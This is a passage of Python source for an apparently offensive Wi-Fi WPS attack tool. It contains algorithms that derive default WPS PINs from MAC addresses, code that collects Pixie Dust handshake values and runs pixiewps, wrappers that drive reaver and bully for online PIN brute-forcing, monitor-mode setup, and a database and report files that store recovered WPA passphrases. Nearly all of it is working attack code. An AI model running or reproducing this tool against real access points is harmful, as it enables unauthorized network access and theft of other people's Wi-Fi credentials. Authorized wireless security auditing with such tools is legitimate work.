        for i in range(7):
            denom = (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
            if denom == 0:
                denom = 10
            digits.append(str((b[i % 6] + b[5]) % denom))
        return int(''.join(digits))

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return (((b[0] + b[1]) % 10) +
                (((b[5] + b[0]) % 10) * 10) +
                (((b[4] + b[5]) % 10) * 100) +
                (((b[3] + b[4]) % 10) * 1000) +
                (((b[2] + b[3]) % 10) * 10000) +
                (((b[1] + b[2]) % 10) * 100000) +
                (((b[0] + b[1]) % 10) * 1000000))

    def pinInvNIC(self, mac):
        nic = mac.integer & 0xFFFFFF
        return (~nic) & 0xFFFFFF

    def pinNIC2(self, mac):
        nic = mac.integer & 0xFFFFFF
        return (nic * 2) & 0xFFFFFF

    def pinNIC3(self, mac):
        nic = mac.integer & 0xFFFFFF
        return (nic * 3) & 0xFFFFFF

    def pinOUIaddNIC(self, mac):
        oui = (mac.integer >> 24) & 0xFFFFFF
        nic = mac.integer & 0xFFFFFF
        return (oui + nic) & 0xFFFFFF

    def pinOUIxorNIC(self, mac):
        oui = (mac.integer >> 24) & 0xFFFFFF
        nic = mac.integer & 0xFFFFFF
        return oui ^ nic


# ---------------------------------------------------------------------------
# PixiewpsData
# ---------------------------------------------------------------------------
class PixiewpsData:
    _REQUIRED_HEX_FIELDS = {
        'pke': 384, 'pkr': 384, 'e_nonce': 32,
        'authkey': 64, 'e_hash1': 64, 'e_hash2': 64,
    }
    _OPTIONAL_HEX_FIELDS = {
        'r_nonce': 32, 'e_s1': 32, 'e_s2': 32,
        'r_s1': 32, 'r_s2': 32,
    }
    _ALL_HEX_FIELDS = {**_REQUIRED_HEX_FIELDS, **_OPTIONAL_HEX_FIELDS}

    _RE_WPA = {
        'pke':     re.compile(r'WPS:\s*PKE\s*[:=]\s*([0-9A-Fa-f]+)'),
        'pkr':     re.compile(r'WPS:\s*PKR\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_nonce': re.compile(r'WPS:\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_nonce': re.compile(r'WPS:\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
        'authkey': re.compile(r'WPS:\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_hash1': re.compile(r'WPS:\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_hash2': re.compile(r'WPS:\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_s1':    re.compile(r'WPS:\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_s2':    re.compile(r'WPS:\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_s1':    re.compile(r'WPS:\s*R-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_s2':    re.compile(r'WPS:\s*R-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
    }
    _RE_REAVER = {
        'pke':     re.compile(r'\[P\]\s*E-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'pkr':     re.compile(r'\[P\]\s*R-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_nonce': re.compile(r'\[P\]\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'r_nonce': re.compile(r'\[P\]\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'authkey': re.compile(r'\[P\]\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash1': re.compile(r'\[P\]\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash2': re.compile(r'\[P\]\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s1':    re.compile(r'\[P\]\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s2':    re.compile(r'\[P\]\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
    }
    _RE_BULLY = {
        'pke':     re.compile(r'PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'pkr':     re.compile(r'PKR\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_nonce': re.compile(r'E-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'r_nonce': re.compile(r'R-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'authkey': re.compile(r'AUTHKEY\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash1': re.compile(r'E-HASH1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash2': re.compile(r'E-HASH2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s1':    re.compile(r'E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s2':    re.compile(r'E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
    }
    _RE_PIXIE_PIN = re.compile(r'\[#\]\s*WPS\s+pin\s*[:=]\s*(\d+)', re.I)
    _RE_PIXIE_PSK = re.compile(r'\[#\]\s*WPA\s+PSK\s*[:=]\s*(.+)', re.I)

    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.r_nonce = ''
        self.e_s1 = ''
        self.e_s2 = ''
        self.r_s1 = ''
        self.r_s2 = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return all(getattr(self, f) for f in self._REQUIRED_HEX_FIELDS)

    def missing_fields(self):
        return [f for f in self._REQUIRED_HEX_FIELDS if not getattr(self, f)]

    def populated_fields(self):
        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
                if getattr(self, f)}

    def completeness(self):
        filled = sum(1 for f in self._REQUIRED_HEX_FIELDS if getattr(self, f))
        return filled, len(self._REQUIRED_HEX_FIELDS)

    def status_line(self):
        filled, total = self.completeness()
        if filled == total:
            return f'{filled}/{total} fields captured — ready for pixiewps'
        missing = ', '.join(self.missing_fields())
        return f'{filled}/{total} fields captured (missing: {missing})'

    def _validate(self, strict=True):
        fields = self._REQUIRED_HEX_FIELDS if strict else {}
        for name, length in self._ALL_HEX_FIELDS.items():
            v = getattr(self, name)
            if not v:
                if name in fields:
                    raise ValueError(f'Required field {name} is empty')
                continue
            v_upper = v.upper()
            if len(v_upper) != length:
                raise ValueError(
                    f'Field {name} has length {len(v_upper)}, expected {length}')
            if not all(c in '0123456789ABCDEF' for c in v_upper):
                raise ValueError(f'Field {name} is not valid hex')

    def get_pixie_args(self, full_range=False, timeout=None):
        self._validate()
        args = ['pixiewps',
                '--pke', self.pke, '--pkr', self.pkr,
                '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
                '--authkey', self.authkey, '--e-nonce', self.e_nonce]
        if self.r_nonce:
            args.extend(['--r-nonce', self.r_nonce])
        if self.e_s1:
            args.extend(['--e-s1', self.e_s1])
        if self.e_s2:
            args.extend(['--e-s2', self.e_s2])
        if self.r_s1:
            args.extend(['--r-s1', self.r_s1])
        if self.r_s2:
            args.extend(['--r-s2', self.r_s2])
        if full_range:
            args.append('--force')
        if timeout is not None:
            args.extend(['--timeout', str(int(timeout))])
        return args

    def get_pixie_cmd(self, full_range=False, timeout=None):
        return ' '.join(self.get_pixie_args(full_range, timeout))

    def run_pixiewps(self, full_range=False, timeout=None, verbose=False):
        if not shutil.which('pixiewps'):
            print('[!] pixiewps not found in PATH')
            return None, None
        args = self.get_pixie_args(full_range, timeout)
        try:
            proc = subprocess.run(
                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace', timeout=timeout or 300)
        except subprocess.TimeoutExpired:
            print('[!] pixiewps timed out')
            return None, None
        except Exception as e:
            print(f'[!] pixiewps execution error: {e}')
            return None, None
        output = proc.stdout or ''
        if verbose:
            for line in output.splitlines():
                print(f'  [pixiewps] {line}')
        pin = None
        psk = None
        for line in output.splitlines():
            m = self._RE_PIXIE_PIN.search(line)
            if m:
                pin = m.group(1)
            m = self._RE_PIXIE_PSK.search(line)
            if m:
                psk = m.group(1).strip()
        return pin, psk

    def _parse_output(self, text, patterns):
        count = 0
        for field, rx in patterns.items():
            m = rx.search(text)
            if m:
                value = m.group(1).upper().strip()
                if value and not getattr(self, field):
                    setattr(self, field, value)
                    count += 1
        return count

    def from_wpa_supplicant(self, text):
        return self._parse_output(text, self._RE_WPA)

    def from_reaver(self, text):
        return self._parse_output(text, self._RE_REAVER)

    def from_bully(self, text):
        return self._parse_output(text, self._RE_BULLY)

    def from_any_backend(self, text):
        total = self.from_wpa_supplicant(text)
        total += self.from_reaver(text)
        total += self.from_bully(text)
        return total

    def to_dict(self):
        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
                if getattr(self, f)}

    @classmethod
    def from_dict(cls, data):
        obj = cls()
        for field in cls._ALL_HEX_FIELDS:
            v = data.get(field, '')
            if v:
                setattr(obj, field, v.upper().strip())
        return obj

    def to_json(self):
        import json
        return json.dumps(self.to_dict(), indent=2)

    @classmethod
    def from_json(cls, json_str):
        import json
        return cls.from_dict(json.loads(json_str))

    def __repr__(self):
        filled, total = self.completeness()
        extras = sum(1 for f in self._OPTIONAL_HEX_FIELDS if getattr(self, f))
        return (f'PixiewpsData({filled}/{total} required, '
                f'{extras} optional, '
                f'ready={self.got_all()})')


# ---------------------------------------------------------------------------
# Attack backends
# ---------------------------------------------------------------------------
BACKEND_INTERNAL = 'internal'
BACKEND_REAVER = 'reaver'
BACKEND_BULLY = 'bully'
BACKENDS = (BACKEND_INTERNAL, BACKEND_REAVER, BACKEND_BULLY)


class AttackResult:
    __slots__ = ('success', 'pin', 'psk', 'essid', 'error')

    def __init__(self, success=False, pin='', psk='', essid='', error=''):
        self.success = success
        self.pin = pin
        self.psk = psk
        self.essid = essid
        self.error = error

    def __bool__(self):
        return self.success

    def __repr__(self):
        if self.success:
            return (f'AttackResult(success=True, pin={self.pin!r}, '
                    f'psk={self.psk!r}, essid={self.essid!r})')
        return f'AttackResult(success=False, error={self.error!r})'


def setup_monitor_mode(iface):
    if shutil.which('airmon-ng'):
        subprocess.run(['airmon-ng', 'check', 'kill'],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        r = subprocess.run(['airmon-ng', 'start', iface],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           encoding='utf-8', errors='replace')
        for line in (r.stdout or '').splitlines():
            m = re.search(r'\b(\w+mon)\b', line)
            if m:
                return m.group(1)
        mon = iface + 'mon'
        if os.path.exists(f'/sys/class/net/{mon}'):
            return mon
        return iface
    subprocess.run(['ip', 'link', 'set', iface, 'down'],
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(['iw', iface, 'set', 'monitor', 'none'],
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(['ip', 'link', 'set', iface, 'up'],
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return iface


def teardown_monitor_mode(iface, original_iface):
    if shutil.which('airmon-ng'):
        subprocess.run(['airmon-ng', 'stop', iface],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        subprocess.run(['ip', 'link', 'set', iface, 'down'],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['iw', iface, 'set', 'type', 'managed'],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', original_iface, 'up'],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class ReaverAttacker:
    def __init__(self, interface, verbose=False, timeout=300,
                 delay=None, json_mode=False):
        self.interface = interface
        self.verbose = verbose
        self.timeout = timeout
        self.delay = delay
        self.json_mode = json_mode

    @staticmethod
    def is_available():
        return shutil.which('reaver') is not None

    def pixie_dust(self, bssid, channel=None):
        argv = self._base_argv(bssid, channel)
        argv += ['-K', '1']
        return self._run(argv, label='Pixie Dust (reaver)')

    def bruteforce(self, bssid, channel=None, start_pin=None):
        argv = self._base_argv(bssid, channel)
        if self.delay is not None:
            argv += ['-d', str(int(self.delay))]
        if start_pin:
            argv += ['-p', start_pin]
        return self._run(argv, label='Brute-force (reaver)',
                         timeout=self.timeout * 10)

    def single_pin(self, bssid, pin, channel=None):
        argv = self._base_argv(bssid, channel)
        argv += ['-p', pin]
        return self._run(argv, label=f'PIN {pin} (reaver)')

    def pbc(self, bssid=None, channel=None):
        argv = ['reaver', '-i', self.interface]
        if bssid:
            argv += ['-b', bssid]
        if channel:
            argv += ['-c', str(channel)]
        argv += ['--pbc']
        argv += ['-vv'] if self.verbose else ['-v']
        argv += ['-L', '-N']
        return self._run(argv, label='Push Button Connect (reaver)')

    def _base_argv(self, bssid, channel=None):
        argv = ['reaver', '-i', self.interface, '-b', bssid]
        if channel:
            argv += ['-c', str(channel)]
        argv += ['-vv'] if self.verbose else ['-v']
        argv += ['-L', '-N']
        return argv

    def _run(self, argv, label='reaver', timeout=None):
        timeout = timeout or self.timeout
        print(f'[*] Running {label}…')
        if self.verbose:
            print(f'[D] {" ".join(argv)}')
        try:
            proc = subprocess.run(
                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace', timeout=timeout)
        except subprocess.TimeoutExpired:
            print(f'[!] {label} timed out after {timeout}s')
            return AttackResult(error='timeout')
        except FileNotFoundError:
            print('[!] reaver binary not found in PATH')
            return AttackResult(error='not_found')
        output = proc.stdout or ''
        if self.verbose:
            print(output)
        return self._parse_output(output)

    @staticmethod
    def _parse_output(output):
        pin = psk = essid = ''
        for line in output.splitlines():
            m = re.search(r"\[\+\]\s*WPS\s*PIN:\s*'([^']*)'", line)
            if m:
                pin = m.group(1)
            m = re.search(r"\[\+\]\s*WPA\s*PSK:\s*'([^']*)'", line)
            if m:
                psk = m.group(1)
            m = re.search(r"\[\+\]\s*AP\s*SSID:\s*'([^']*)'", line)
            if m:
                essid = m.group(1)
        if pin or psk:
            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
        if 'WPS transaction failed' in output:
            return AttackResult(error='wps_transaction_failed')
        if 'WARNING: Detected AP rate limiting' in output:
            return AttackResult(error='rate_limited')
        if 'AP has locked its WPS' in output or 'WPS lockout' in output:
            return AttackResult(error='wps_locked')
        return AttackResult(error='no_result')


class BullyAttacker:
    def __init__(self, interface, verbose=False, timeout=300,
                 delay=None, json_mode=False):
        self.interface = interface
        self.verbose = verbose
        self.timeout = timeout
        self.delay = delay
        self.json_mode = json_mode

    @staticmethod
    def is_available():
        return shutil.which('bully') is not None

    def pixie_dust(self, bssid, channel=None):
        argv = self._base_argv(bssid, channel)
        argv += ['-d']
        return self._run(argv, label='Pixie Dust (bully)')

    def bruteforce(self, bssid, channel=None, start_pin=None):
        argv = self._base_argv(bssid, channel)
        if start_pin:
            argv += ['-p', start_pin]
        return self._run(argv, label='Brute-force (bully)',
                         timeout=self.timeout * 10)

    def single_pin(self, bssid, pin, channel=None):
        argv = self._base_argv(bssid, channel)
        argv += ['-p', pin]
        return self._run(argv, label=f'PIN {pin} (bully)')

    def _base_argv(self, bssid, channel=None):
        argv = ['bully', '-b', bssid]
        if channel:
            argv += ['-c', str(channel)]
        argv += ['-v', '4'] if self.verbose else ['-v', '2']
        if self.delay is not None:
            argv += ['-l', str(int(self.delay))]
        argv.append(self.interface)
        return argv

    def _run(self, argv, label='bully', timeout=None):
        timeout = timeout or self.timeout
        print(f'[*] Running {label}…')
        if self.verbose:
            print(f'[D] {" ".join(argv)}')
        try:
            proc = subprocess.run(
                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace', timeout=timeout)
        except subprocess.TimeoutExpired:
            print(f'[!] {label} timed out after {timeout}s')
            return AttackResult(error='timeout')
        except FileNotFoundError:
            print('[!] bully binary not found in PATH')
            return AttackResult(error='not_found')
        output = proc.stdout or ''
        if self.verbose:
            print(output)
        return self._parse_output(output)

    @staticmethod
    def _parse_output(output):
        pin = psk = essid = ''
        for line in output.splitlines():
            m = re.search(
                r"\[\+\]\s*Pin\s+is\s+'([^']*)',\s*key\s+is\s+'([^']*)'",
                line)
            if m:
                pin, psk = m.group(1), m.group(2)
                continue
            m = re.search(r"\[\*\]\s*Pin:\s*(\S+)", line)
            if m and not pin:
                pin = m.group(1)
            m = re.search(r"\[\*\]\s*Key:\s*(.+)", line)
            if m and not psk:
                psk = m.group(1).strip()
            m = re.search(r"SSID:\s*'([^']*)'", line)
            if m and not essid:
                essid = m.group(1)
            m = re.search(r"for\s+'([^']+)'", line)
            if m and not essid:
                essid = m.group(1)
        if pin or psk:
            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
        if 'WPS lockout' in output or 'locked' in output.lower():
            return AttackResult(error='wps_locked')
        return AttackResult(error='no_result')


def _handle_backend_result(result, bssid, db=None, save_result=False,
                           reports_dir=None, json_mode=False):
    if not result.success:
        if result.error == 'wps_locked':
            print(f'[-] AP {bssid} has locked its WPS interface')
        elif result.error == 'rate_limited':
            print(f'[!] AP {bssid} rate-limiting detected — back off')
        elif result.error == 'timeout':
            pass
        elif result.error == 'not_found':
            pass
        else:
            print(f'[-] Attack unsuccessful against {bssid}')
        return False

    print(f"[+] WPS PIN: '{result.pin}'")
    print(f"[+] WPA PSK: '{result.psk}'")
    if result.essid:
        print(f"[+] AP SSID: '{result.essid}'")

    if json_mode:
        rec = {
            'ts': datetime.now().isoformat(),
            'event': 'credentials',
            'wps_pin': result.pin,
            'wpa_psk': result.psk,
            'essid': result.essid,
            'bssid': bssid,
        }
        print(json.dumps(rec, ensure_ascii=False), flush=True)

    if db:
        db.save_credentials(bssid, result.essid, result.pin, result.psk)

    if save_result and reports_dir:
        os.makedirs(reports_dir, exist_ok=True)
        filename = os.path.join(reports_dir, 'stored')
        dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {result.essid}\n'
                    f'WPS PIN: {result.pin}\nWPA PSK: {result.psk}\n\n')
        header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, result.essid, result.pin, result.psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    return True


# ---------------------------------------------------------------------------
# Status trackers
# ---------------------------------------------------------------------------
class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.nack_count = 0
        self.locked = False

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
        if not self.mask or not self.mask.isdigit():
            pct = 0.0
        elif len(self.mask) <= 4:
            pct = int(self.mask) / 11000 * 100
        elif len(self.mask) >= 7:
            pct = ((10000 / 11000) + (int(self.mask[4:7]) / 11000)) * 100
        else:
            pct = int(self.mask) / 11000 * 100
        print(f'[*] {pct:.2f}% complete @ {self.start_time} '
              f'({avg:.2f} seconds/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


# ---------------------------------------------------------------------------
# TargetDB
# ---------------------------------------------------------------------------
class TargetDB:
    SCHEMA = """
    CREATE TABLE IF NOT EXISTS targets (
        bssid TEXT PRIMARY KEY,
        essid TEXT, model TEXT, model_number TEXT, device_name TEXT,
        chipset TEXT, pixie_vuln INTEGER DEFAULT 0, locked INTEGER DEFAULT 0,
        wps_pin TEXT, wpa_psk TEXT,
        last_seen TEXT, attempts INTEGER DEFAULT 0, success INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS oui_vendor (
        prefix TEXT PRIMARY KEY, vendor TEXT
    );
    """

    def __init__(self, path):
        self.path = path
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(path)
        self.conn.executescript(self.SCHEMA)
        self.conn.commit()
        self._seed_oui()

    def _seed_oui(self):
        self.conn.executemany(
            'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
            list(OUI_BUILTIN.items()))
        self.conn.commit()

    def load_oui_file(self, path):
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            rows = []
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = re.split(r'\s+', line, maxsplit=1)
                if len(parts) == 2:
                    prefix = parts[0].replace(':', '').replace('-', '').upper()[:6]
                    rows.append((prefix, parts[1]))
            self.conn.executemany(
                'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
                rows)
            self.conn.commit()

    def vendor_for(self, bssid):
        prefix = bssid.replace(':', '').upper()[:6]
        cur = self.conn.execute(
            'SELECT vendor FROM oui_vendor WHERE prefix=?', (prefix,))
        row = cur.fetchone()
        return row[0] if row else 'Unknown'

    def upsert(self, net):
        self.conn.execute("""
            INSERT INTO targets (bssid, essid, model, model_number, device_name,
                                 chipset, pixie_vuln, locked, last_seen)
            VALUES (?,?,?,?,?,?,?,?, datetime('now'))
            ON CONFLICT(bssid) DO UPDATE SET
                essid=excluded.essid, model=excluded.model,
                model_number=excluded.model_number,
                device_name=excluded.device_name,
                chipset=excluded.chipset, pixie_vuln=excluded.pixie_vuln,
                locked=excluded.locked, last_seen=datetime('now')
        """, (net['BSSID'], net.get('ESSID', 'HIDDEN'), net.get('Model', ''),
              net.get('Model number', ''), net.get('Device name', ''),
              net.get('Chipset', ''), int(net.get('Pixie vulnerable', False)),
              int(net.get('WPS locked', False))))
        self.conn.commit()

    def known_pin(self, bssid):
        cur = self.conn.execute(
            'SELECT wps_pin FROM targets WHERE bssid=? AND wps_pin IS NOT NULL '
            'AND wps_pin != ""', (bssid,))
        row = cur.fetchone()
        return row[0] if row else None

    def save_credentials(self, bssid, essid, pin, psk):
        cur = self.conn.execute(
            'UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 '
            'WHERE bssid=?', (pin, psk, bssid))
        if cur.rowcount == 0:
            self.conn.execute(
                'INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
                'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
                (bssid, essid, pin, psk))
        self.conn.commit()

    def bump_attempts(self, bssid):
        self.conn.execute(
            'UPDATE targets SET attempts = attempts + 1 WHERE bssid=?',
            (bssid,))
        self.conn.commit()

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Companion
# ---------------------------------------------------------------------------
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False,
                 bssid='', db: Optional[TargetDB] = None,
                 json_mode=False, trace_log=None,
                 pixiewps_timeout=120, cool_down=60, auto_mode=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.json_mode = json_mode
        self.pixiewps_timeout = pixiewps_timeout
        self.cool_down = cool_down
        self.auto_mode = auto_mode
        self._constructed = False

        self.tempdir = tempfile.mkdtemp()
        try:
            with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.conf', delete=False) as temp:
                temp.write(
                    f'ctrl_interface={self.tempdir}\n'
                    'ctrl_interface_group=root\nupdate_config=1\n')
                self.tempconf = temp.name
            self.wpas_ctrl_path = f'{self.tempdir}/{interface}'
            self.__init_wpa_supplicant()

            self.res_socket_file = (
                f'{tempfile._get_default_tempdir()}/'
                f'{next(tempfile._get_candidate_names())}')
            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.retsock.bind(self.res_socket_file)
        except Exception:
            self._cleanup_partial()
            raise

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        home = str(pathlib.Path.home())
        self.sessions_dir = os.path.join(home, '.WispHound', 'sessions')
        self.pixiewps_dir = os.path.join(home, '.WispHound', 'pixiewps')
        self.reports_dir = os.path.join(
            os.path.dirname(os.path.realpath(__file__)), 'reports')
        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
            os.makedirs(d, exist_ok=True)

        self.db = db or TargetDB(os.path.join(home, '.WispHound', 'targets.db'))
        self._own_db = db is None

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0
        self.target_is_pixie_vuln = False
        self.target_chipset = ''

        self._trace_fp = open(trace_log, 'a', encoding='utf-8') if trace_log else None
        self._constructed = True

    def _cleanup_partial(self):
        try:
            if getattr(self, 'retsock', None):
                self.retsock.close()
        except Exception:
            pass
        try:
            if getattr(self, 'res_socket_file', None) and \
                    os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
        except Exception:
            pass
        try:
            if getattr(self, 'wpas', None):
                self.wpas.terminate()
                try:
                    self.wpas.wait(timeout=2)
                except Exception:
                    self.wpas.kill()
        except Exception:
            pass
        shutil.rmtree(getattr(self, 'tempdir', ''), ignore_errors=True)
        try:
            os.remove(getattr(self, 'tempconf', ''))
        except Exception:
            pass

    def cleanup(self):
        self._cleanup_partial()
        if getattr(self, '_trace_fp', None):
            try:
                self._trace_fp.close()
            except Exception:
                pass
        if getattr(self, '_own_db', False) and getattr(self, 'db', None):
            self.db.close()

    def __del__(self):
        try:
            self.cleanup()
        except Exception:
            pass

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        argv = ['wpa_supplicant', '-K', '-d',
                '-Dnl80211,wext,hostapd,wired',
                f'-i{self.interface}', f'-c{self.tempconf}']
        self.wpas = subprocess.Popen(
            argv, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError(
                    'wpa_supplicant returned an error: '
                    + (self.wpas.communicate()[0] or ''))
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, _ = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
            return ('[!] wpa_supplicant is compiled without WPS protocol support. '
                    'Rebuild with CONFIG_WPS=y')
        return '[!] Something went wrong — check out debug log'

    def _emit_json(self, event, **fields):
        if not self.json_mode:
            return
        rec = {'ts': datetime.now().isoformat(), 'event': event, **fields}
        print(json.dumps(rec, ensure_ascii=False), flush=True)

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None,
                      bssid=''):
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')
        if self._trace_fp:
            self._trace_fp.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators(
                    '*', f'Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators(
                    '*', f'Received WPS Message M{n}')
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.connection_status.nack_count += 1
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'Registrar Nonce' in line and 'hexdump' in line:
                self.pixie_creds.r_nonce = get_hex(line)
                if pixiemode:
                    print(f'[P] R-Nonce: {self.pixie_creds.r_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    print(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    print(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    print(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'E-S1' in line and 'hexdump' in line:
                self.pixie_creds.e_s1 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-S1: {self.pixie_creds.e_s1}')
            elif 'E-S2' in line and 'hexdump' in line:
                self.pixie_creds.e_s2 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-S2: {self.pixie_creds.e_s2}')
